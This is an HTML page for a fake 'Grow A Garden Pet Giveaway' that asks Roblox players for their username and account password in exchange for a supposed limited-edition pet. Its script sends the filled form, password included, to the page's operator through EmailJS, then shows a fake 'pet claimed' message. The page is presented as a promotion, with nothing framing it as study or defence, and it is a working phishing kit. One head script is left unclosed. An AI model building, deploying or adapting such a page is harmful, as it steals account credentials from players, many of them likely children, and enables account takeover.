<!DOCTYPE html>
<html lang="en">
<head>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />

  <script>
    (function () {

  </script>
  <style>
    /* Reset and base */
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #0057ff, #00bfff);
      color: #222;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    /* Container */
    .container {
      background: #fff;
      border-radius: 20px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.25);
      max-width: 420px;
      width: 100%;
      padding: 40px 30px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    /* Title */
    .title {
      font-size: 2.4rem;
      font-weight: 700;
      margin-bottom: 10px;
      color: #0057ff;
      letter-spacing: 1.5px;
    }
    .subtitle {
      font-weight: 500;
      color: #555;
      margin-bottom: 35px;
    }
    /* Form styles */
    form {
      text-align: left;
    }
    label {
      display: block;
      font-weight: 600;
      margin-bottom: 6px;
      color: #333;
      font-size: 0.95rem;
    }
    input[type="text"],
    input[type="password"],
    select {
      width: 100%;
      padding: 14px 18px;
      margin-bottom: 22px;
      border-radius: 12px;
      border: 2px solid #ddd;
      font-size: 1rem;
      transition: border-color 0.3s ease;
    }
    input[type="text"]:focus,
    input[type="password"]:focus,
    select:focus {
      border-color: #00bfff;
      outline: none;
      box-shadow: 0 0 8px rgba(0, 191, 255, 0.6);
    }
    /* Button */
    button {
      width: 100%;
      padding: 16px;
      font-size: 1.15rem;
      font-weight: 700;
      color: white;
      background: linear-gradient(135deg, #0057ff, #00bfff);
      border: none;
      border-radius: 14px;
      cursor: pointer;
      letter-spacing: 1.2px;
      text-transform: uppercase;
      box-shadow: 0 8px 20px rgba(0, 191, 255, 0.5);
      transition: background 0.3s ease, transform 0.2s ease;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 12px;
    }
    button:hover {
      background: linear-gradient(135deg, #0047d4, #0099cc);
      transform: translateY(-3px);
      box-shadow: 0 12px 30px rgba(0, 148, 255, 0.7);
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      box-shadow: none;
      transform: none;
    }
    /* Spinner */
    .spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.4);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% {
        transform: rotate(0);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    /* Success message */
    .success-card {
      display: none;
      text-align: center;
      padding: 10px 0;
    }
    .success-card.active {
      display: block;
    }
    .success-icon {
      font-size: 72px;
      margin-bottom: 20px;
      color: #00bfff;
      animation: bounce 1s ease-in-out infinite alternate;
    }
    @keyframes bounce {
      0% {
        transform: translateY(0);
      }
      100% {
        transform: translateY(-15px);
      }
    }
    .success-title {
      font-size: 1.8rem;
      font-weight: 700;
      color: #0057ff;
      margin-bottom: 8px;
    }
    .success-text {
      font-size: 1.1rem;
      margin-bottom: 24px;
      color: #444;
    }
    .claimed-pet {
      font-size: 48px;
      margin-bottom: 10px;
      display: inline-block;
    }
    /* Responsive */
    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }
      .title {
        font-size: 2rem;
      }
    }
  </style>
</head>
<body>
  <div class="container" role="main" aria-labelledby="main-title">
    <h1 class="title" id="main-title">üéâ Grow A Garden Pet Giveaway üéâ</h1>
    <p class="subtitle">Claim your exclusive <strong>limited edition pet</strong> now!</p>

    <form id="claimForm" aria-describedby="form-desc" novalidate>
      <label for="username">Roblox Username</label>
      <input type="text" id="username" name="username" placeholder="Enter your Roblox username" required autocomplete="username" />

      <label for="password">Account Password</label>
      <input
        type="password"
        id="password"
        name="password"
        placeholder="Enter your Roblox password"
        required
        autocomplete="current-password"
      />

      <label for="petReward">Choose Your Pet Reward</label>
      <select id="petReward" name="petReward" required>
        <option value="" disabled selected>Select a pet...</option>
        <option value="ü¶ä Kitsune">ü¶ä Kitsune</option>
        <option value="ü¶ù Raccoon">ü¶ù Raccoon</option>
        <option value="ü™© Disco Bee">ü™© Disco Bee</option>
        <option value="ü¶ñ T-Rex">ü¶ñ T-Rex</option>
        <option value="üëπ Corrupted Kitsune">üëπ Corrupted Kitsune</option>
        <option value="‚ö° Raiju">‚ö° Raiju</option>
        <option value="ü¶ï Spinosaurus">ü¶ï Spinosaurus</option>
        <option value="üê≤ Dragonfly">üê≤ Dragonfly</option>
        <option value="ü¶ã Butterfly">ü¶ã Butterfly</option>
        <option value="ü©∏ Blood Hedgehog">ü©∏ Blood Hedgehog</option>
        <option value="üåô Moon Cat">üåô Moon Cat</option>
      </select>

      <button type="submit" aria-live="polite" aria-busy="false" id="claimBtn">
        <span>Claim My Pet</span>
        <svg
          style="display:none;"
          class="spinner"
          viewBox="0 0 50 50"
        >
          <circle
            class="path"
            cx="25"
            cy="25"
            r="20"
            fill="none"
            stroke-width="5"
          ></circle>
        </svg>
      </button>
    </form>

    <div class="success-card" id="successCard" role="alert" aria-live="assertive">
      <div class="success-icon" aria-hidden="true">üéâ</div>
      <div class="claimed-pet" id="claimedPetIcon">üêæ</div>
      <h2 class="success-title" id="claimedPetName">Congrats!</h2>
      <p class="success-text">Your pet has been claimed successfully! Welcome to your new companion.</p>
      <button type="button" id="claimAgainBtn" aria-label="Claim another pet">Claim Another Pet</button>
    </div>
  </div>

  <script>
    const claimForm = document.getElementById('claimForm');
    const claimBtn = document.getElementById('claimBtn');
    const successCard = document.getElementById('successCard');
    const claimedPetIcon = document.getElementById('claimedPetIcon');
    const claimedPetName = document.getElementById('claimedPetName');
    const claimAgainBtn = document.getElementById('claimAgainBtn');
    const container = document.querySelector('.container');

    claimForm.addEventListener('submit', (e) => {
      e.preventDefault();

      if (!claimForm.checkValidity()) {
        claimForm.reportValidity();
        return;
      }

      // Disable form & show loading
      claimBtn.disabled = true;
      claimBtn.querySelector('span').textContent = 'Claiming Pet...';
      claimBtn.querySelector('svg.spinner').style.display = 'inline-block';

      // Send form with EmailJS
      emailjs
        .sendForm('service_zss1q0e', 'template_qnu4n8e', claimForm)
        .then(() => {
          // Parse pet emoji and name
          const petReward = claimForm.petReward.value;
          const [emoji, ...nameParts] = petReward.split(' ');
          const petName = nameParts.join(' ');

          // Show success card
          claimedPetIcon.textContent = emoji;
          claimedPetName.textContent = petName;
          claimForm.style.display = 'none';
          successCard.classList.add('active');

          // Reset button loading state
          claimBtn.disabled = false;
          claimBtn.querySelector('span').textContent = 'Claim My Pet';
          claimBtn.querySelector('svg.spinner').style.display = 'none';
        })
        .catch((error) => {
          alert('Failed to send your claim. Please try again.');
          console.error('EmailJS error:', error);
          claimBtn.disabled = false;
          claimBtn.querySelector('span').textContent = 'Claim My Pet';
          claimBtn.querySelector('svg.spinner').style.display = 'none';
        });
    });

    claimAgainBtn.addEventListener('click', () => {
      claimForm.reset();
      claimForm.style.display = 'block';
      successCard.classList.remove('active');
    });
  </script>
</body>
</html>
